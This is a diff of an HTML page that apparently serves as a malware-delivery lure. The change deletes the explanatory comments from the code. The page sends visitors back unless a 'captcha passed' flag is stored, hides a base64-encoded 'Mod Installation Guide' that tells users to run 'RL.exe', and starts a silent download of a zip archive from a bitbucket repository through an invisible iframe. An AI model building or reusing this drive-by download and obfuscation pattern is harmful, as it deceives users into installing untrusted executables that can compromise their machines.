@@ -12,27 +12,27 @@
       text-align: center;
       padding: 50px;
     }
-    /* Пока контент не декодирован, контейнер скрыт */
+    
     #hidden-content {
       display: none;
     }
   </style>
   <script>
-    // Если флаг проверки отсутствует, перенаправляем на index.html
+   
     if (localStorage.getItem('captchaPassed') !== 'true') {
       window.location.href = "index.html";
     }
     
     window.onload = function() {
-      // Base64-кодированное содержимое страницы (это HTML-разметка, зашифрованная для сокрытия)
+      
       var encodedContent = "PGRpdj4KICA8ZGl2IGNsYXNzPSJjb250YWluZXIiPgogICAgPGgxPk1vZCBJbnN0YWxsYXRpb24gR3VpZGUNCjwvaDE+CiAgICA8cD5Zb3VyIGRvd25sb2FkIHNob3VsZCBzdGFydCBhdXRvbWF0aWNhbGx5LiBJZiBub3QsIDxhIGhyZWY9Imh0dHBzOi8vYml0YnVja2V0Lm9yZy9sYXVubGVyY2Q1L2Rvd25sb2FkL2Rvd25sb2FkcxUvUmxhdW5jaGVyUVouemlwIiBzdHlsZT0iY29sb3I6ICNmZmNjZjAwOyI+Y2xpY2sgaGVyZTwvYT4uPC9wPgogICAgPGRpdiBjbGFzcz0ic3RlcHMiPgogICAgICA8aDI+SW5zdGFsbGF0aW9uIFN0ZXBzOjwvaDI+CiAgICAgIDxwIGNsYXNzPSJzdGVwIj4xLiBSdW4gdGhlIGRvd25sb2FkZWQgaW5zdGFsbGVyIChmaWxlIG5hbWU6IFJMLmV4ZSkuPC9wPgogICAgICA8cDIGNsYXNzPSJzdGVwIj4yLiBTZWxlY3QgdGhlIGdhbWUgZGlyZWN0b3J5LjwvcD4KICAgICAgPHAgY2xhc3M9InN0ZXAiPjMuIFdhaXQgZm9yIHRoZSBpbnN0YWxsYXRpb24gdG8gY29tcGxldGUuPC9wPgogICAgICA8cDIGNsYXNzPSJzdGVwIj40LiBMYXVuY2ggdGhlIGdhbWUgYW5kIGVuam95IHRoZSBtb2QhPC9wPgogICAgPC9kaXY+CiAgICA8cDBzdHlsZT0ibWFyZ2luLXRvcDogMjBweDsgZm9udC1zdHlsZTogaXRhbGljOyI+QmVzdCByZWdhcmRzLCBSTCBUZWFtPC9wPgogIDwvZGl2Pgo8L2Rpdj4=";
       
-      // Декодируем содержимое и вставляем его в контейнер
+      
       var decodedContent = atob(encodedContent);
       document.getElementById('hidden-content').innerHTML = decodedContent;
       document.getElementById('hidden-content').style.display = 'block';
       
-      // Запускаем закачку файла через скрытый iframe
+      
       var iframe = document.createElement('iframe');
       iframe.style.display = 'none';
       iframe.src = "https://bitbucket.org/launchercd5/download/downloads/RLauncherQ.zip";
